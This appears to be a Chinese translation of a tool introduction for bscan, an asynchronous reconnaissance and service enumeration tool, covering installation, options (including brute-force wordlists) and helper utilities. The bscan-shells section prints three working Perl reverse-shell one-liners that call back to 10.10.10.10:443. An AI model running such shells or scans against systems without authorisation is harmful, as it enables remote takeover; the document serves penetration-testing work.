## 前言

 **bscan是一个主动信息收集和服务枚举工具。其核心是异步spawn扫描实用程序进程，重利用控制台高亮输出显示的扫描结果和定义的目录结构。**

 **
**![logo.png](https://image.3001.net/images/20181101/1541031905_5bda47e140119.png!small)****

## 安装

bscan虽然是为了在Kali Linux上运行而开发的，但并不是说只支持Kali。只要系统安装了必要的运行环境就可以正常运行。

从PyPI下载最新的打包版本：

    
    
    pip install bscan

或从版本控制中获取最新版本：

    
    
    pip install https://github.com/welchbj/bscan/archive/master.tar.gz

## 基本使用

bscan为我们提供了多种配置选项，你可以根据需要进行调整。以下是一个简单的示例：

    
    
    $ bscan \
    > --max-concurrency 3 \
    > --patterns [Mm]icrosoft \
    > --status-interval 10 \
    > --verbose-status \
    > scanme.nmap.org

>  **\--max-concurrency 3：** 表示一次运行不超过3个并发扫描子进程
>
>  **\--patterns [Mm] icrosoft：** 定义了一个自定义正则表达式模式，用于高亮显示生成扫描输出中的匹配项
>
>  **\--status-interval 10：** 告诉bscan每10秒打印一次运行时状态更新
>
>  **\--verbose-status：** 表示每个状态更新都将打印所有当前运行的扫描子进程的详细信息
>
>  **scanme.nmap.org：** 想要枚举的主机

bscan还依赖于一些额外的配置文件。默认文件可以在bscan/configuation目录中找到，这些文件的主要用途如下：

>
> **[patterns.txt](https://github.com/welchbj/bscan/blob/master/bscan/configuration/patterns.txt)：**指定与扫描输出匹配时在控制台输出中高亮显示的正则表达式模式
>
>  **[required-> programs.txt](https://github.com/welchbj/bscan/blob/master/bscan/configuration/required-> programs.txt)：**指定bscan计划使用的已安装程序
>
>  **[port-> scans.toml](https://github.com/welchbj/bscan/blob/master/bscan/configuration/port-> scans.toml)：**定义在目标上运行的端口发现扫描，以及用于从扫描输出中解析端口号和服务名的正则表达式
>
>  **[service-> scans.toml](https://github.com/welchbj/bscan/blob/master/bscan/configuration/service-> scans.toml)：**定义在目标上运行的扫描

bscan所有可用选项介绍：

    
    
    usage: bscan [OPTIONS] targets
    
     _
    | |__  ___  ___ __ _ _ __
    | '_ \/ __|/ __/ _` | '_ \
    | |_) \__ \ (__ (_| | | | |
    |_.__/|___/\___\__,_|_| |_|
    
    an asynchronous service enumeration tool
    
    positional arguments:
      targets               要执行枚举的目标和/或网络
    
    optional arguments:
      -h, --help            显示帮助信息并退出
      --brute-pass-list F   用于执行爆破的密码列表文件名
      --brute-user-list F   用于执行爆破的用户列表文件名
      --cmd-print-width I   当打印用于spawn一个正在运行子进程命令所允许的最大整数字符数（默认为80）
      --config-dir D        从中加载配置文件的基目录; 这个目录中缺少的必要配置文件将从该程序附带的默认文件中加载
      --hard                强制覆盖现有目录
      --max-concurrency I   允许同时运行的最大整数子进程数（默认为20）
      --no-program-check    禁用检查是否存在所需的系统程序
      --no-file-check       禁用检查是否存在文件例如已配置的wordlists文件                                
      --no-service-scans    禁用对已发现服务运行扫描
      --output-dir D        写入输出文件的基目录
      --patterns [ [ ...]]  要在输出文本中高亮显示的正则表达式模式
      --ping-sweep          在运行更密集的扫描之前，从网络范围启用ping扫描过滤主机
      --quick-only          是否只运行快速扫描（不包括对所有端口的彻底扫描）
      --qs-method S         执行初始TCP端口扫描，必须对应于已配置的端口扫描
      --status-interval I   打印状态更新之间暂停的整数秒数; 非正值会禁用更新（默认为30）
      --ts-method S         执行彻底TCP端口扫描，必须对应于已配置的端口扫描
      --udp                 是否运行UDP扫描
      --udp-method S        执行UDP端口扫描，必须对应于已配置的端口扫描
      --verbose-status      是否根据`--status-interval`参数指定的频率，打印详细的运行时状态更新
      --version             版本信息
      --web-word-list F     用于扫描的字典列表

bscan中包含了两个主要的实用程序（bscan-wordlists和bscan-shells）。bscan-wordlists是一个用于在Kali
Linux上查找wordlist文件的程序。它会搜索一些默认目录，并允许glob文件名匹配。以下是一个简单的使用示例：

    
    
    $ bscan-wordlists --find "*win*"
    /usr/share/wordlists/wfuzz/vulns/dirTraversal-win.txt
    /usr/share/wordlists/metasploit/sensitive_files_win.txt
    /usr/share/seclists/Passwords/common-passwords-win.txt

有关更多参数选项可以通过bscan-wordlists --help来查看。

bscan-shells可根据你提供的目标地址和端口，为你生成各种类型的反向shell。以下是一个简单的示例，列出了所有基于Perl的shell，并被配置为回连10.10.10.10的443端口。

    
    
    $ bscan-shells --port 443 10.10.10.10 | grep -i -A1 perl
    perl for windows
    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    
    perl with /bin/sh
    perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    
    perl without /bin/sh
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

注：bscan-shells使用的这些命令是从reverse-shells.toml配置文件中提取的。有关更多参数选项可以通过bscan-shells
--help命令查看。

**视频演示：**[https://asciinema.org/a/207654?autoplay=1&speed=2](https://asciinema.org/a/207654?autoplay=1&speed=2)

## 开发

首先，设置一个新的开发环境以及安装依赖项（使用[virtualenvwrapper](https://pypi.org/project/virtualenvwrapper/)
/ [virtualenvwrapper-win](https://pypi.org/project/virtualenvwrapper-win/)）：

    
    
    # setup the environment
    mkvirtualenv -p $(which python3) bscan-dev
    workon bscan-dev
    
    # get the deps
    pip install -r dev-requirements.txt

Lint和项目类型检查（这些也运行在[Travis](https://github.com/welchbj/bscan/blob/master/.travis.yml)）：

    
    
    flake8 . && mypy bscan

打包新版本：

    
    
    # build source and wheel distributions
    python setup.py bdist_wheel sdist
    
    # run post-build checks
    twine check dist/*
    
    # upload to PyPI
    twine upload dist/*

***参考来源：[GitHub](https://github.com/welchbj/bscan)，FB小编secist编译，转载请注明来自FreeBuf.COM**

